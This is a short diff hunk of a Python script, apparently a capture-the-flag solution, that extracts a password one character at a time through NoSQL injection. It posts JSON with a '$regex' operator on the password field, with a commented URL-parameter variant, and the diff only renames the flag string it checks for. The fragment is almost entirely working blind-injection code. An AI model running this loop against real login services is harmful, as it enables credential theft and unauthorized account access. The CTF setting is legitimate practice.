@@ -16,6 +16,6 @@ while True:
             payload = {"username": "{}".format(username), "password": {'$regex': "^{}".format(password + c)}}
             # payload='?username=%s&password[$regex]=^%s' % (username, password + c)
             r = requests.post(url, json=payload, verify=False)
-            if 'axactf' in r.text:
+            if 'companyctf' in r.text:
                 print("Found one more char : {}".format(password+c))
                 password += c
